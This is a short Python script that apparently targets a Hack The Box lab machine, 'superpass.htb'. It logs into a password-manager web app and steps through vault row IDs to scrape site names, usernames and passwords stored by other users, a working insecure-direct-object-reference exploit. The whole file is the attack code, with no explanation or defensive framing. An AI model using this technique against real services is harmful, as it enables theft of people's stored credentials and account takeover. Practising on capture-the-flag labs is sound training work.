#!/usr/bin/python3
import requests, bs4
from pwn import log

target = "http://superpass.htb"
session = requests.Session()

data = {"username": "username", "password": "password", "submit": ""}
session.post(target + "/account/login", data=data)

for id in range(0,10):
    request = session.get(target + "/vault/row/" + str(id))
    soup = bs4.BeautifulSoup(request.content, "html.parser")
    rows = soup.find_all("tr", class_="password-row")

    for row in rows:
        cols = row.find_all("td")
        sitename = cols[1].get_text()
        username = cols[2].get_text()
        password = cols[3].get_text()

        if sitename != "":
            log.info(f"Credentials in row {id}:")
            print(f"\tSitename: {sitename}")
            print(f"\tUsername: {username}")
            print(f"\tPassword: {password}")
            print("\r")
